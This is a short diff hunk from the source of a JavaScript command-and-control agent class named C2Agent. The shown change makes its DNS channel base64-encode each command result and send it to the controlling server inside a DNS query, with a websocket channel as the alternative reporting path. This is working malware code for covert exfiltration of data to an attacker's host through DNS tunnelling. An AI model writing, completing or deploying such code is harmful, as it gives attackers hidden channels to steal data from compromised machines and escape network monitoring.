@@ -226,9 +226,8 @@ class C2Agent extends EventEmitter {
         this.ws.send(JSON.stringify({ type: 'result', id: this.agentId, result }));
       } catch (e) {}
     } else if (channel === 'dns') {
-      // Report via DNS query with result encoded in subdomain
       const encoded = Buffer.from(JSON.stringify({ id: this.agentId, result })).toString('base64').replace(/=+$/, '');
-      this.dns.sendQuery(this.agentId, this.serverHost, this.dnsPort, () => {});
+      this.dns.sendResultQuery(this.agentId, encoded, this.serverHost, this.dnsPort);
     }
   }
 
